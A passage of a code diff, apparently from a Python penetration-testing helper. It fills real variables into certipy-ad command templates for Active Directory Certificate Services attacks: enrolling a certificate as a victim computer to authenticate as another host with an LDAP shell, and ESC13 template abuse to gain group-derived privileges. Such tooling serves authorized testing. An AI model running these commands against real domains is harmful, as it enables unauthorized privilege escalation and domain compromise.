                 f"-user {victim} -dns <TARGET_HOST>.{domain}\n"
                 "# 3) Enroll cert as victim computer\n"
-                f"certipy-ad req -u {victim} -p <VICTIM_PASSWORD> -ca <CA-NAME> "
-                "-target <CA-SERVER> -template <VULN_TEMPLATE>\n"
+                f"certipy-ad req -u {victim} -p {victim_password} -ca {ca_name} "
+                f"-target {ca_server} -template <VULN_TEMPLATE>\n"
                 "# 4) Authenticate as mapped target computer\n"
-                "certipy-ad auth -pfx <TARGET_HOST>.pfx -dc-ip <DC_IP> -ldap-shell"
+                f"certipy-ad auth -pfx <TARGET_HOST>.pfx -dc-ip {dc_ip} -ldap-shell"
             )
 
         # ADCS ESC13
         if normalized_edge == "ADCSESC13":
             return (
                 "# ADCS ESC13: enroll via template with issuance policy OID->group link\n"
-                f"certipy-ad req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
-                "-target <CA-SERVER> -template <ESC13_TEMPLATE>\n"
+                f"certipy-ad req -u {username}@{domain} -p {source_password} -ca {ca_name} "
+                f"-target {ca_server} -template <ESC13_TEMPLATE>\n"
                 "# Use issued certificate to obtain TGT / authenticate with group-derived privileges\n"
-                "certipy-ad auth -pfx <USER>.pfx -dc-ip <DC_IP>"
+                f"certipy-ad auth -pfx <USER>.pfx -dc-ip {dc_ip}"
             )
 
         tool = EDGE_TOOL_MAP.get(normalized_edge, "manual")
